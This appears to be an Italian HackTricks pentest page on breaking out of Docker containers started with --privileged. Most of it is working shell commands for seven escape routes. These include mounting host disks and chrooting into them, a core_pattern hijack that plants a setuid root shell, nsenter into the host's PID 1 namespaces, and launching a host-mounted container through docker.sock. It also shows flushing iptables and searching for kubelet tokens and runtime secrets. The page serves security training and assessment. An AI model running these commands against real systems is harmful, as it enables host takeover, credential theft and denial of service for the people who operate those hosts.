# Evasione dai container `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un container avviato con `--privileged` non è la stessa cosa di un container normale con una o due autorizzazioni in più. In pratica, `--privileged` rimuove o indebolisce diverse protezioni runtime di default che normalmente tengono il workload lontano da risorse pericolose dell'host. L'effetto esatto dipende ancora dal runtime e dall'host, ma per Docker il risultato tipico è:

- tutte le capabilities vengono concesse
- le restrizioni dei device cgroup vengono rimosse
- molti filesystem del kernel smettono di essere montati in sola lettura
- i percorsi procfs mascherati di default scompaiono
- il filtraggio seccomp viene disabilitato
- il confinement AppArmor viene disabilitato
- l'isolamento SELinux viene disabilitato o sostituito con un'etichetta molto più ampia

La conseguenza importante è che un container privileged di solito non ha bisogno di un exploit kernel sottile. In molti casi può semplicemente interagire direttamente con dispositivi dell'host, filesystem del kernel esposti all'host o interfacce del runtime e poi ottenere una shell sull'host.

## Cosa `--privileged` Non Cambia Automaticamente

`--privileged` non entra automaticamente nei namespace PID, network, IPC o UTS dell'host. Un container privileged può comunque avere namespace privati. Questo significa che alcune catene di escape richiedono una condizione aggiuntiva come:

- una bind mount dell'host
- condivisione del PID con l'host
- networking dell'host
- dispositivi dell'host visibili
- interfacce proc/sys scrivibili

Queste condizioni sono spesso facili da soddisfare in reali misconfigurazioni, ma sono concettualmente separate da `--privileged` stesso.

## Percorsi di escape

### 1. Montare il disco dell'host tramite dispositivi esposti

Un container privileged di solito vede molti più nodi dispositivo sotto `/dev`. Se il device block dell'host è visibile, l'escape più semplice è montarlo e usare `chroot` nel filesystem dell'host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Se la partizione root non è ovvia, enumera prima il layout dei blocchi:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Se la via pratica è piantare un setuid helper in un mount host scrivibile invece di `chroot`, ricorda che non tutti i filesystem onorano il setuid bit. Un rapido controllo delle capability lato host è:
```bash
mount | grep -v "nosuid"
```
Questo è utile perché i percorsi scrivibili su filesystem con `nosuid` sono molto meno interessanti per i flussi di lavoro classici di "drop a setuid shell and execute it later".

Le protezioni indebolite sfruttate qui sono:

- esposizione completa dei dispositivi
- ampie capabilities, specialmente `CAP_SYS_ADMIN`

Pagine correlate:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montare o riutilizzare un bind mount dell'host e `chroot`

Se il filesystem root dell'host è già montato all'interno del container, oppure se il container può creare i mount necessari perché è privilegiato, una shell dell'host è spesso a un solo `chroot` di distanza:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se non esiste alcun bind mount della root dell'host ma lo storage dell'host è raggiungibile, creane uno:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Questa via sfrutta:

- restrizioni sui mount indebolite
- capabilities completi
- mancanza di confinamento MAC

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abuso di `/proc/sys` o `/sys` scrivibili

Una delle grandi conseguenze di `--privileged` è che le protezioni di procfs e sysfs diventano molto più deboli. Questo può esporre interfacce del kernel rivolte all'host che normalmente sono mascherate o montate in sola lettura.

Un esempio classico è `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Altri percorsi di alto valore includono:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Questo percorso sfrutta:

- percorsi mascherati mancanti
- percorsi di sistema in sola lettura mancanti

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usare le capabilities complete per l'evasione basata su mount o namespace

Un container privilegiato ottiene le capabilities che sono normalmente rimosse dai container standard, inclusi `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, e molte altre. Questo è spesso sufficiente per trasformare un local foothold in un host escape non appena esiste un'altra superficie esposta.

Un esempio semplice è montare filesystem aggiuntivi e usare l'entrata nei namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Se anche il PID host è condiviso, il passo diventa ancora più breve:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Questo percorso sfrutta:

- il set di capability privilegiate di default
- la condivisione opzionale del PID dell'host

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Evasione tramite socket del runtime

Un container privilegiato spesso si ritrova con lo stato del runtime dell'host o i socket visibili. Se è raggiungibile un socket Docker, containerd o CRI-O, l'approccio più semplice è spesso usare l'API del runtime per lanciare un secondo container con accesso all'host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Per containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Questo percorso sfrutta:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Rimuovere gli effetti collaterali dell'isolamento di rete

`--privileged` di per sé non unisce il container al network namespace dell'host, ma se il container ha anche `--network=host` o altro accesso alla rete dell'host, l'intero stack di rete diventa modificabile:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Non sempre si ottiene una shell diretta sull'host, ma può consentire denial of service, traffic interception o l'accesso a servizi di gestione accessibili solo tramite loopback.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Leggere i segreti dell'host e lo stato di runtime

Anche quando l'escape verso una shell pulita non è immediata, i container privilegiati spesso hanno accesso sufficiente per leggere i segreti dell'host, lo stato del kubelet, i metadati di runtime e i filesystem dei container vicini:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Se `/var` è host-mounted o le directory di runtime sono visibili, questo può essere sufficiente per lateral movement o cloud/Kubernetes credential theft anche prima di ottenere una host shell.

Pagine correlate:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Controlli

Lo scopo dei comandi seguenti è confermare quali privileged-container escape families sono immediatamente praticabili.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
What is interesting here:

- un set completo di capability, especially `CAP_SYS_ADMIN`
- esposizione di proc/sys scrivibile
- dispositivi host visibili
- assenza di seccomp e confinamento MAC
- socket di runtime o bind mount della root dell'host

Any one of those may be enough for post-exploitation. Several together usually mean the container is functionally one or two commands away from host compromise.

## Related Pages

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
